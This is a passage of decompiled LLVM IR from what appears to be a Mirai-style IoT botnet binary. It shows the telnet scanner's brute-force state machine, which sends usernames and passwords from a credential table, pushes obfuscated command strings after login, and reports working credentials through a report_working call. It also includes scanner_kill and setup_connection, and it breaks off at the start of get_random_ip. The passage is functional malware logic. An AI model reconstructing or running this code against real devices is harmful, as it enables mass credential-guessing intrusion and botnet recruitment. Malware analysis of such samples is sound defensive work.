dec_label_pc_172d8:                               ; preds = %dec_label_pc_17290, %dec_label_pc_172a0
  %v0_172d8 = call i32 @__GI___errno_location()
  %v2_172e4 = inttoptr i32 %v0_172d8 to i32*
  store i32 0, i32* %v2_172e4, align 4
  %v3_172ec = load i32, i32* %v2_16fd8, align 4
  %v3_172fc = load i32, i32* %v2_17294, align 4
  %v2_17300 = add i32 %v3_172fc, %v1_172a4
  %v1_1730c = sub i32 256, %v3_172fc
  %v1_17314 = inttoptr i32 %v2_17300 to i8*
  %v6_17320 = call i32 @recv_strip_null(i32 %v3_172ec, i8* %v1_17314, i32 %v1_1730c, i32 16384)
  %v2_17330 = icmp eq i32 %v6_17320, 0
  br i1 %v2_17330, label %dec_label_pc_17338, label %dec_label_pc_17350

dec_label_pc_17338:                               ; preds = %dec_label_pc_172d8
  %v0_17338 = call i32 @__GI___errno_location()
  %v2_17344 = inttoptr i32 %v0_17338 to i32*
  store i32 104, i32* %v2_17344, align 4
  br label %dec_label_pc_17350

dec_label_pc_17350:                               ; preds = %dec_label_pc_172d8, %dec_label_pc_17338
  %consumed_-60.0 = phi i32 [ -1, %dec_label_pc_17338 ], [ %v6_17320, %dec_label_pc_172d8 ]
  %v3_17354 = icmp eq i32 %consumed_-60.0, -1
  br i1 %v3_17354, label %dec_label_pc_1735c, label %dec_label_pc_173e8

dec_label_pc_1735c:                               ; preds = %dec_label_pc_17350
  %v0_1735c = call i32 @__GI___errno_location()
  %v1_17364 = inttoptr i32 %v0_1735c to i32*
  %v2_17364 = load i32, i32* %v1_17364, align 4
  %v7_17368 = icmp eq i32 %v2_17364, 11
  br i1 %v7_17368, label %dec_label_pc_179a0, label %dec_label_pc_17370

dec_label_pc_17370:                               ; preds = %dec_label_pc_1735c
  %v0_17370 = call i32 @__GI___errno_location()
  %v1_17378 = inttoptr i32 %v0_17370 to i32*
  %v2_17378 = load i32, i32* %v1_17378, align 4
  %v7_1737c = icmp eq i32 %v2_17378, 11
  br i1 %v7_1737c, label %dec_label_pc_179a0, label %dec_label_pc_17384

dec_label_pc_17384:                               ; preds = %dec_label_pc_17370
  %v3_17388 = load i32, i32* %v2_16fd8, align 4
  %v1_17390 = call i32 @__GI___libc_close(i32 %v3_17388)
  store i32 -1, i32* %v2_16fd8, align 4
  %v3_173a0 = load i32, i32* %i_-148, align 4
  %v4_173a8 = mul i32 %v3_173a0, 4
  %v5_173a8 = add i32 %v4_173a8, ptrtoint ([256 x i32]* @authindex_table to i32)
  %v6_173a8 = inttoptr i32 %v5_173a8 to i32*
  %v7_173a8 = load i32, i32* %v6_173a8, align 4
  %v2_173b0 = load i32, i32* @auth_table_len, align 4
  %v1_173b4 = add i32 %v2_173b0, -1
  %v7_173bc = icmp sgt i32 %v7_173a8, %v1_173b4
  br i1 %v7_173bc, label %dec_label_pc_173c0, label %dec_label_pc_173dc

dec_label_pc_173c0:                               ; preds = %dec_label_pc_17384
  store i8 0, i8* %v4_178a4, align 1
  store i32 0, i32* %v2_17284, align 4
  br label %dec_label_pc_179a0

dec_label_pc_173dc:                               ; preds = %dec_label_pc_17384
  call void @setup_connection(i32 %v2_16fcc)
  br label %dec_label_pc_179a0

dec_label_pc_173e8:                               ; preds = %dec_label_pc_17350
  %v3_173ec = load i32, i32* %v2_17294, align 4
  %v2_173f4 = add i32 %v3_173ec, %consumed_-60.0
  store i32 %v2_173f4, i32* %v2_17294, align 4
  %v2_17404 = load i32, i32* @fake_time, align 4
  store i32 %v2_17404, i32* %v3_17410, align 4
  br label %dec_label_pc_17414

dec_label_pc_17414:                               ; preds = %dec_label_pc_17954, %dec_label_pc_173e8
  %v3_17420 = load i32, i32* %v2_17284, align 4
  switch i32 %v3_17420, label %dec_label_pc_17920 [
    i32 2, label %dec_label_pc_17458
    i32 3, label %dec_label_pc_17484
    i32 4, label %dec_label_pc_174fc
    i32 5, label %dec_label_pc_17574
    i32 6, label %dec_label_pc_17604
    i32 7, label %dec_label_pc_17694
    i32 8, label %dec_label_pc_17724
    i32 9, label %dec_label_pc_177b4
    i32 10, label %dec_label_pc_17844
  ]

dec_label_pc_17458:                               ; preds = %dec_label_pc_17414
  %v2_1745c = call i32 @consume_iacs(i32 %v2_16fcc)
  %tmp121 = icmp slt i32 %v2_1745c, 1
  br i1 %tmp121, label %dec_label_pc_17928, label %dec_label_pc_17474

dec_label_pc_17474:                               ; preds = %dec_label_pc_17458
  store i32 3, i32* %v2_17284, align 4
  br label %dec_label_pc_17928

dec_label_pc_17484:                               ; preds = %dec_label_pc_17414
  %v2_17488 = call i32 @consume_user_prompt(i32 %v2_16fcc)
  %tmp122 = icmp slt i32 %v2_17488, 1
  br i1 %tmp122, label %dec_label_pc_17928, label %dec_label_pc_174a0

dec_label_pc_174a0:                               ; preds = %dec_label_pc_17484
  %v3_174a4 = load i32, i32* %v2_16fd8, align 4
  %v2_174ac = load i32, i32* %v1_174ac, align 4
  %v1_174b0 = inttoptr i32 %v2_174ac to i32*
  %v2_174b0 = load i32, i32* %v1_174b0, align 4
  %v1_174bc = add i32 %v2_174ac, 12
  %v2_174bc = inttoptr i32 %v1_174bc to i8*
  %v3_174bc = load i8, i8* %v2_174bc, align 1
  %v4_174bc = zext i8 %v3_174bc to i32
  %v5_174cc = call i32 @__libc_send(i32 %v3_174a4, i32 %v2_174b0, i32 %v4_174bc, i32 16384)
  %v3_174d4 = load i32, i32* %v2_16fd8, align 4
  %v5_174e8 = call i32 @__libc_send(i32 %v3_174d4, i32 ptrtoint ([3 x i8]* @global_var_23074.289 to i32), i32 2, i32 16384)
  store i32 4, i32* %v2_17284, align 4
  br label %dec_label_pc_17928

dec_label_pc_174fc:                               ; preds = %dec_label_pc_17414
  %v2_17500 = call i32 @consume_pass_prompt(i32 %v2_16fcc)
  %tmp123 = icmp slt i32 %v2_17500, 1
  br i1 %tmp123, label %dec_label_pc_17928, label %dec_label_pc_17518

dec_label_pc_17518:                               ; preds = %dec_label_pc_174fc
  %v3_1751c = load i32, i32* %v2_16fd8, align 4
  %v2_17524 = load i32, i32* %v1_174ac, align 4
  %v1_17528 = add i32 %v2_17524, 4
  %v2_17528 = inttoptr i32 %v1_17528 to i32*
  %v3_17528 = load i32, i32* %v2_17528, align 4
  %v1_17534 = add i32 %v2_17524, 13
  %v2_17534 = inttoptr i32 %v1_17534 to i8*
  %v3_17534 = load i8, i8* %v2_17534, align 1
  %v4_17534 = zext i8 %v3_17534 to i32
  %v5_17544 = call i32 @__libc_send(i32 %v3_1751c, i32 %v3_17528, i32 %v4_17534, i32 16384)
  %v3_1754c = load i32, i32* %v2_16fd8, align 4
  %v5_17560 = call i32 @__libc_send(i32 %v3_1754c, i32 ptrtoint ([3 x i8]* @global_var_23074.289 to i32), i32 2, i32 16384)
  store i32 5, i32* %v2_17284, align 4
  br label %dec_label_pc_17928

dec_label_pc_17574:                               ; preds = %dec_label_pc_17414
  %v2_17578 = call i32 @consume_any_prompt(i32 %v2_16fcc)
  %tmp124 = icmp slt i32 %v2_17578, 1
  br i1 %tmp124, label %dec_label_pc_17928, label %dec_label_pc_17590

dec_label_pc_17590:                               ; preds = %dec_label_pc_17574
  call void @table_unlock_val(i8 21)
  %v3_175a4 = call i8* @table_retrieve_val(i32 21, i32* nonnull %err_len_-184)
  %v5_175a4 = ptrtoint i8* %v3_175a4 to i32
  %v3_175b4 = load i32, i32* %v2_16fd8, align 4
  %v3_175b8 = load i32, i32* %err_len_-184, align 4
  %v5_175cc = call i32 @__libc_send(i32 %v3_175b4, i32 %v5_175a4, i32 %v3_175b8, i32 16384)
  %v3_175d4 = load i32, i32* %v2_16fd8, align 4
  %v5_175e8 = call i32 @__libc_send(i32 %v3_175d4, i32 ptrtoint ([3 x i8]* @global_var_23074.289 to i32), i32 2, i32 16384)
  call void @table_lock_val(i8 21)
  store i32 6, i32* %v2_17284, align 4
  br label %dec_label_pc_17928

dec_label_pc_17604:                               ; preds = %dec_label_pc_17414
  %v2_17608 = call i32 @consume_any_prompt(i32 %v2_16fcc)
  %tmp125 = icmp slt i32 %v2_17608, 1
  br i1 %tmp125, label %dec_label_pc_17928, label %dec_label_pc_17620

dec_label_pc_17620:                               ; preds = %dec_label_pc_17604
  call void @table_unlock_val(i8 22)
  %v3_17634 = call i8* @table_retrieve_val(i32 22, i32* nonnull %stack_var_-188)
  %v5_17634 = ptrtoint i8* %v3_17634 to i32
  %v3_17644 = load i32, i32* %v2_16fd8, align 4
  %v3_17648 = load i32, i32* %stack_var_-188, align 4
  %v5_1765c = call i32 @__libc_send(i32 %v3_17644, i32 %v5_17634, i32 %v3_17648, i32 16384)
  %v3_17664 = load i32, i32* %v2_16fd8, align 4
  %v5_17678 = call i32 @__libc_send(i32 %v3_17664, i32 ptrtoint ([3 x i8]* @global_var_23074.289 to i32), i32 2, i32 16384)
  call void @table_lock_val(i8 22)
  store i32 7, i32* %v2_17284, align 4
  br label %dec_label_pc_17928

dec_label_pc_17694:                               ; preds = %dec_label_pc_17414
  %v2_17698 = call i32 @consume_any_prompt(i32 %v2_16fcc)
  %tmp126 = icmp slt i32 %v2_17698, 1
  br i1 %tmp126, label %dec_label_pc_17928, label %dec_label_pc_176b0

dec_label_pc_176b0:                               ; preds = %dec_label_pc_17694
  call void @table_unlock_val(i8 20)
  %v3_176c4 = call i8* @table_retrieve_val(i32 20, i32* nonnull %stack_var_-192)
  %v5_176c4 = ptrtoint i8* %v3_176c4 to i32
  %v3_176d4 = load i32, i32* %v2_16fd8, align 4
  %v3_176d8 = load i32, i32* %stack_var_-192, align 4
  %v5_176ec = call i32 @__libc_send(i32 %v3_176d4, i32 %v5_176c4, i32 %v3_176d8, i32 16384)
  %v3_176f4 = load i32, i32* %v2_16fd8, align 4
  %v5_17708 = call i32 @__libc_send(i32 %v3_176f4, i32 ptrtoint ([3 x i8]* @global_var_23074.289 to i32), i32 2, i32 16384)
  call void @table_lock_val(i8 20)
  store i32 8, i32* %v2_17284, align 4
  br label %dec_label_pc_17928

dec_label_pc_17724:                               ; preds = %dec_label_pc_17414
  %v2_17728 = call i32 @consume_any_prompt(i32 %v2_16fcc)
  %tmp127 = icmp slt i32 %v2_17728, 1
  br i1 %tmp127, label %dec_label_pc_17928, label %dec_label_pc_17740

dec_label_pc_17740:                               ; preds = %dec_label_pc_17724
  call void @table_unlock_val(i8 23)
  %v3_17754 = call i8* @table_retrieve_val(i32 23, i32* nonnull %stack_var_-196)
  %v5_17754 = ptrtoint i8* %v3_17754 to i32
  %v3_17764 = load i32, i32* %v2_16fd8, align 4
  %v3_17768 = load i32, i32* %stack_var_-196, align 4
  %v5_1777c = call i32 @__libc_send(i32 %v3_17764, i32 %v5_17754, i32 %v3_17768, i32 16384)
  %v3_17784 = load i32, i32* %v2_16fd8, align 4
  %v5_17798 = call i32 @__libc_send(i32 %v3_17784, i32 ptrtoint ([3 x i8]* @global_var_23074.289 to i32), i32 2, i32 16384)
  call void @table_lock_val(i8 23)
  store i32 9, i32* %v2_17284, align 4
  br label %dec_label_pc_17928

dec_label_pc_177b4:                               ; preds = %dec_label_pc_17414
  %v2_177b8 = call i32 @consume_any_prompt(i32 %v2_16fcc)
  %tmp128 = icmp slt i32 %v2_177b8, 1
  br i1 %tmp128, label %dec_label_pc_17928, label %dec_label_pc_177d0

dec_label_pc_177d0:                               ; preds = %dec_label_pc_177b4
  call void @table_unlock_val(i8 24)
  %v3_177e4 = call i8* @table_retrieve_val(i32 24, i32* nonnull %stack_var_-200)
  %v5_177e4 = ptrtoint i8* %v3_177e4 to i32
  %v3_177f4 = load i32, i32* %v2_16fd8, align 4
  %v3_177f8 = load i32, i32* %stack_var_-200, align 4
  %v5_1780c = call i32 @__libc_send(i32 %v3_177f4, i32 %v5_177e4, i32 %v3_177f8, i32 16384)
  %v3_17814 = load i32, i32* %v2_16fd8, align 4
  %v5_17828 = call i32 @__libc_send(i32 %v3_17814, i32 ptrtoint ([3 x i8]* @global_var_23074.289 to i32), i32 2, i32 16384)
  call void @table_lock_val(i8 24)
  store i32 10, i32* %v2_17284, align 4
  br label %dec_label_pc_17928

dec_label_pc_17844:                               ; preds = %dec_label_pc_17414
  %v2_17848 = call i32 @consume_resp_prompt(i32 %v2_16fcc)
  %v3_17858 = icmp eq i32 %v2_17848, -1
  br i1 %v3_17858, label %dec_label_pc_17860, label %dec_label_pc_178c4

dec_label_pc_17860:                               ; preds = %dec_label_pc_17844
  %v3_17864 = load i32, i32* %v2_16fd8, align 4
  %v1_1786c = call i32 @__GI___libc_close(i32 %v3_17864)
  store i32 -1, i32* %v2_16fd8, align 4
  %v3_1787c = load i32, i32* %i_-148, align 4
  %v4_17884 = mul i32 %v3_1787c, 4
  %v5_17884 = add i32 %v4_17884, ptrtoint ([256 x i32]* @authindex_table to i32)
  %v6_17884 = inttoptr i32 %v5_17884 to i32*
  %v7_17884 = load i32, i32* %v6_17884, align 4
  %v2_1788c = load i32, i32* @auth_table_len, align 4
  %v1_17890 = add i32 %v2_1788c, -1
  %v7_17898 = icmp sgt i32 %v7_17884, %v1_17890
  br i1 %v7_17898, label %dec_label_pc_1789c, label %dec_label_pc_178b8

dec_label_pc_1789c:                               ; preds = %dec_label_pc_17860
  store i8 0, i8* %v4_178a4, align 1
  store i32 0, i32* %v2_17284, align 4
  br label %dec_label_pc_17928

dec_label_pc_178b8:                               ; preds = %dec_label_pc_17860
  call void @setup_connection(i32 %v2_16fcc)
  br label %dec_label_pc_17928

dec_label_pc_178c4:                               ; preds = %dec_label_pc_17844
  %tmp129 = icmp slt i32 %v2_17848, 1
  br i1 %tmp129, label %dec_label_pc_17928, label %dec_label_pc_178d0

dec_label_pc_178d0:                               ; preds = %dec_label_pc_178c4
  %v3_178d4 = load i32, i32* %v2_178d4, align 4
  %v3_178dc = load i16, i16* %v2_178dc, align 2
  %v2_178e4 = load i32, i32* %v1_174ac, align 4
  call void @report_working(i32 %v3_178d4, i16 %v3_178dc, i32 %v2_178e4)
  %v3_178f8 = load i32, i32* %v2_16fd8, align 4
  %v1_17900 = call i32 @__GI___libc_close(i32 %v3_178f8)
  store i32 -1, i32* %v2_16fd8, align 4
  store i32 0, i32* %v2_17284, align 4
  br label %dec_label_pc_17928

dec_label_pc_17920:                               ; preds = %dec_label_pc_17414
  br label %dec_label_pc_17928

dec_label_pc_17928:                               ; preds = %dec_label_pc_178c4, %dec_label_pc_177b4, %dec_label_pc_17724, %dec_label_pc_17694, %dec_label_pc_17604, %dec_label_pc_17574, %dec_label_pc_174fc, %dec_label_pc_17484, %dec_label_pc_17458, %dec_label_pc_178d0, %dec_label_pc_178b8, %dec_label_pc_1789c, %dec_label_pc_177d0, %dec_label_pc_17740, %dec_label_pc_176b0, %dec_label_pc_17620, %dec_label_pc_17590, %dec_label_pc_17518, %dec_label_pc_174a0, %dec_label_pc_17474, %dec_label_pc_17920
  %consumed_-56.0 = phi i32 [ 0, %dec_label_pc_17920 ], [ -1, %dec_label_pc_1789c ], [ -1, %dec_label_pc_178b8 ], [ %v2_17848, %dec_label_pc_178c4 ], [ %v2_17848, %dec_label_pc_178d0 ], [ %v2_177b8, %dec_label_pc_177b4 ], [ %v2_177b8, %dec_label_pc_177d0 ], [ %v2_17728, %dec_label_pc_17724 ], [ %v2_17728, %dec_label_pc_17740 ], [ %v2_17698, %dec_label_pc_17694 ], [ %v2_17698, %dec_label_pc_176b0 ], [ %v2_17608, %dec_label_pc_17604 ], [ %v2_17608, %dec_label_pc_17620 ], [ %v2_17578, %dec_label_pc_17574 ], [ %v2_17578, %dec_label_pc_17590 ], [ %v2_17500, %dec_label_pc_174fc ], [ %v2_17500, %dec_label_pc_17518 ], [ %v2_17488, %dec_label_pc_17484 ], [ %v2_17488, %dec_label_pc_174a0 ], [ %v2_1745c, %dec_label_pc_17458 ], [ %v2_1745c, %dec_label_pc_17474 ]
  %v2_1792c = icmp eq i32 %consumed_-56.0, 0
  br i1 %v2_1792c, label %dec_label_pc_17280.loopexit, label %dec_label_pc_17934

dec_label_pc_17934:                               ; preds = %dec_label_pc_17928
  %v3_17938 = load i32, i32* %v2_17294, align 4
  %v2_17940 = sub i32 %v3_17938, %consumed_-56.0
  %v4_17940 = xor i32 %v3_17938, %consumed_-56.0
  %v5_17940 = xor i32 %v2_17940, %v3_17938
  %v6_17940 = and i32 %v5_17940, %v4_17940
  %v7_17940 = icmp slt i32 %v6_17940, 0
  %v8_17940 = icmp slt i32 %v2_17940, 0
  %v2_17944 = xor i1 %v8_17940, %v7_17940
  br i1 %v2_17944, label %dec_label_pc_17948, label %dec_label_pc_17954

dec_label_pc_17948:                               ; preds = %dec_label_pc_17934
  %v3_1794c = load i32, i32* %v2_17294, align 4
  br label %dec_label_pc_17954

dec_label_pc_17954:                               ; preds = %dec_label_pc_17934, %dec_label_pc_17948
  %consumed_-56.1 = phi i32 [ %v3_1794c, %dec_label_pc_17948 ], [ %consumed_-56.0, %dec_label_pc_17934 ]
  %v3_17958 = load i32, i32* %v2_17294, align 4
  %v2_17960 = sub i32 %v3_17958, %consumed_-56.1
  store i32 %v2_17960, i32* %v2_17294, align 4
  %v2_17980 = add i32 %consumed_-56.1, %v1_172a4
  store i32 %v2_17960, i32* @r3, align 4
  store i32 %v1_172a4, i32* @r0, align 4
  store i32 %v2_17980, i32* @r1, align 4
  store i32 %v2_17960, i32* @r2, align 4
  %v3_17998 = call i32 @memmove(i32 %v1_172a4, i32 %v2_17980, i32 %v2_17960)
  br label %dec_label_pc_17414

dec_label_pc_179a0:                               ; preds = %dec_label_pc_17280.loopexit, %dec_label_pc_17280.preheader, %dec_label_pc_17370, %dec_label_pc_1735c, %dec_label_pc_17238, %dec_label_pc_16fb0, %dec_label_pc_173dc, %dec_label_pc_173c0, %dec_label_pc_17138, %dec_label_pc_170b8
  %v3_179a0 = load i32, i32* %i_-148, align 4
  %v1_179a4 = add i32 %v3_179a0, 1
  store i32 %v1_179a4, i32* %i_-148, align 4
  %v7_179b4 = icmp slt i32 %v1_179a4, 256
  br i1 %v7_179b4, label %dec_label_pc_16fb0, label %dec_label_pc_1684c

dec_label_pc_179bc:                               ; preds = %dec_label_pc_16284, %entry
  store i32 %v3_16254, i32* @r4, align 4
  store i32 %v6_16254, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32 %v1_179a4, { 1, 2, 0 }
  uselistorder i32 %v2_17980, { 1, 0 }
  uselistorder i32 %v2_17960, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17940, { 1, 0 }
  uselistorder i32 %consumed_-56.0, { 1, 0, 2, 3 }
  uselistorder i8* %v4_178a4, { 1, 0 }
  uselistorder i32 %v1_172a4, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32* %v2_17284, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 1 }
  uselistorder i32* %v2_16fd8, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 1, 2, 3, 4, 28, 29, 30 }
  uselistorder i32 %v2_16fcc, { 18, 19, 14, 13, 12, 11, 10, 9, 8, 6, 21, 16, 15, 17, 7, 20, 23, 22, 24, 25, 0, 1, 2, 3, 4, 5, 26 }
  uselistorder i32 %v2_16f54, { 1, 0 }
  uselistorder i32 %v1_16f28, { 1, 2, 0 }
  uselistorder i32 %v3_16f58, { 2, 0, 1, 3, 4 }
  uselistorder i32 %nfds_-116.0, { 1, 0, 2, 3 }
  uselistorder i32* %v2_16d10, { 3, 4, 1, 0, 2, 5, 6 }
  uselistorder i32 %v2_16d04, { 5, 6, 2, 1, 0, 3, 4, 7 }
  uselistorder i32 %nfds_-116.137, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %mfd_wr_-120.138, { 7, 6, 5, 4, 2, 1, 0, 3 }
  uselistorder %anon_struct_4* %v4_16ccc, { 1, 0 }
  uselistorder i32 %v1_16cc8, { 1, 0 }
  uselistorder i32 %v4_16cd0132, { 2, 0, 1 }
  uselistorder i32 %storemerge1936, { 1, 0 }
  uselistorder i32 %storemerge1832, { 0, 4, 2, 1, 3 }
  uselistorder i32 %last_spew_-128.0, { 10, 11, 12, 13, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v2_16ca0, { 1, 0 }
  uselistorder i32 %v2_16c64, { 1, 0 }
  uselistorder i32 %v2_16a10, { 6, 3, 0, 1, 2, 4, 5, 7 }
  uselistorder i32 %v2_1639c, { 2, 1, 0 }
  uselistorder i32 %v1_16350, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %i_-148, { 7, 8, 9, 10, 11, 12, 2, 6, 13, 14, 3, 5, 15, 0, 20, 16, 4, 17, 18, 19, 1 }
  uselistorder %timeval_3* %tim_-156, { 1, 0 }
  uselistorder i32* %err_len_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32* %stack_var_-196, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32 (i32)* @consume_any_prompt, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_23074.289 to i32), { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 4, 3, 1, 0 }
  uselistorder i32 -304, { 1, 0 }
  uselistorder i32 -432, { 1, 0 }
  uselistorder void (i32)* @setup_connection, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_ntohl, { 3, 13, 12, 11, 10, 9, 8, 7, 6, 5, 1, 4, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i16 (i32, i8*, i16, i32)* @checksum_tcpudp, { 1, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 ptrtoint ([40 x i8]* @scanner_rawpkt to i32), { 1, 0 }
  uselistorder i16 (i16*, i32)* @checksum_generic, { 2, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder void (i8*, i8*, i16)* @add_auth_entry, { 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2c29d.198, { 1, 0 }
  uselistorder i8* @global_var_2c29c.196, { 1, 0 }
  uselistorder i16* @global_var_2c292.195, { 1, 0 }
  uselistorder [40 x i8]* @scanner_rawpkt, { 2, 0, 1 }
  uselistorder i8 69, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32)* @__GI_ntohs, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32* @rsck, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 ptrtoint ([256 x i32]* @authindex_table to i32), { 3, 4, 5, 6, 2, 1, 0 }
  uselistorder i32* @conn_table, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 288, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* @LOCAL_ADDR, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ()* @util_local_addr, { 0, 2, 1 }
  uselistorder label %dec_label_pc_179a0, { 6, 7, 2, 3, 0, 1, 4, 8, 9, 5 }
  uselistorder label %dec_label_pc_17954, { 1, 0 }
  uselistorder label %dec_label_pc_17928, { 20, 9, 0, 10, 11, 12, 1, 13, 2, 14, 3, 15, 4, 16, 5, 17, 6, 18, 7, 19, 8 }
  uselistorder label %dec_label_pc_17350, { 1, 0 }
  uselistorder label %dec_label_pc_172d8, { 1, 0 }
  uselistorder label %dec_label_pc_17290, { 1, 0 }
  uselistorder label %dec_label_pc_17238, { 1, 0 }
  uselistorder label %dec_label_pc_16fb0, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_16f24, { 7, 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_16d30, { 1, 0 }
  uselistorder label %dec_label_pc_16ce8, { 1, 0 }
  uselistorder label %dec_label_pc_16cb4, { 1, 0 }
  uselistorder label %dec_label_pc_16c78, { 1, 0 }
  uselistorder label %dec_label_pc_16c78.lr.ph, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16c2c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16ba8, { 1, 0 }
  uselistorder label %dec_label_pc_16a08, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_16888, { 1, 0 }
  uselistorder label %dec_label_pc_16424, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16398, { 1, 0 }
}

define void @scanner_kill() local_unnamed_addr {
entry:
  %v3_179cc = load i32, i32* @fp, align 4
  %v2_179d8 = load i32, i32* @scanner_pid, align 4
  %v2_179e4 = call i32 @kill(i32 %v2_179d8, i32 9)
  store i32 %v3_179cc, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder i32* @scanner_pid, { 1, 0 }
}

define void @setup_connection(i32 %conn) local_unnamed_addr {
entry:
  %addr_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_179f8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_179f8, i32* @ip, align 4
  %v3_179fc = load i32, i32* @r4, align 4
  %v6_179fc = load i32, i32* @fp, align 4
  %v2_17a0c = ptrtoint i32* %addr_-40 to i32
  store i32 0, i32* %addr_-40, align 4
  %v1_17a40 = add i32 %conn, 4
  %v2_17a40 = inttoptr i32 %v1_17a40 to i32*
  %v3_17a40 = load i32, i32* %v2_17a40, align 4
  %v7_17a44 = icmp eq i32 %v3_17a40, -1
  br i1 %v7_17a44, label %dec_label_pc_17a5c, label %dec_label_pc_17a4c

dec_label_pc_17a4c:                               ; preds = %entry
  %v3_17a50 = load i32, i32* %v2_17a40, align 4
  %v1_17a58 = call i32 @__GI___libc_close(i32 %v3_17a50)
  br label %dec_label_pc_17a5c

dec_label_pc_17a5c:                               ; preds = %entry, %dec_label_pc_17a4c
  store i32 1, i32* @r1, align 4
  %v3_17a68 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_17a68, i32* %v2_17a40, align 4
  %v7_17a80 = icmp eq i32 %v3_17a68, -1
  br i1 %v7_17a80, label %dec_label_pc_17b3c, label %dec_label_pc_17a88

dec_label_pc_17a88:                               ; preds = %dec_label_pc_17a5c
  %v2_17a90 = add i32 %conn, 24
  %v3_17a90 = inttoptr i32 %v2_17a90 to i32*
  store i32 0, i32* %v3_17a90, align 4
  %v1_17a98 = add i32 %conn, 28
  %v1_17a9c = inttoptr i32 %v1_17a98 to i8*
  call void @util_zero(i8* %v1_17a9c, i32 256)
  %v3_17aac = load i32, i32* %v2_17a40, align 4
  store i32 %v3_17aac, i32* @r4, align 4
  %v3_17ab4 = load i32, i32* %v2_17a40, align 4
  store i32 %v3_17ab4, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_17ac4 = call i32 @__libc_fcntl(i32 %v3_17ab4, i32 3)
  %v1_17acc = or i32 %v2_17ac4, 2048
  store i32 %v1_17acc, i32* @r3, align 4
  %v0_17ad0 = load i32, i32* @r4, align 4
  store i32 %v1_17acc, i32* @r2, align 4
  %v2_17adc = call i32 @__libc_fcntl(i32 %v0_17ad0, i32 4)
  store i32 2, i32* %addr_-40, align 4
  %v2_17b04 = load i32, i32* @fake_time, align 4
  %v2_17b10 = add i32 %conn, 8
  %v3_17b10 = inttoptr i32 %v2_17b10 to i32*
  store i32 %v2_17b04, i32* %v3_17b10, align 4
  %v2_17b1c = add i32 %conn, 12
  %v3_17b1c = inttoptr i32 %v2_17b1c to i32*
  store i32 1, i32* %v3_17b1c, align 4
  %v3_17b24 = load i32, i32* %v2_17a40, align 4
  %v3_17b38 = call i32 @__libc_connect(i32 %v3_17b24, i32 %v2_17a0c, i32 16)
  br label %dec_label_pc_17b3c

dec_label_pc_17b3c:                               ; preds = %dec_label_pc_17a5c, %dec_label_pc_17a88
  store i32 %v3_179fc, i32* @r4, align 4
  store i32 %v6_179fc, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32* %v2_17a40, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32* @fake_time, { 2, 3, 0, 4, 5, 1 }
  uselistorder void (i8*, i32)* @util_zero, { 10, 19, 18, 17, 16, 15, 14, 13, 12, 11, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_17b3c, { 1, 0 }
  uselistorder label %dec_label_pc_17a5c, { 1, 0 }
}

define i32 @get_random_ip() local_unnamed_addr {
entry:
  br label %dec_label_pc_17b5c

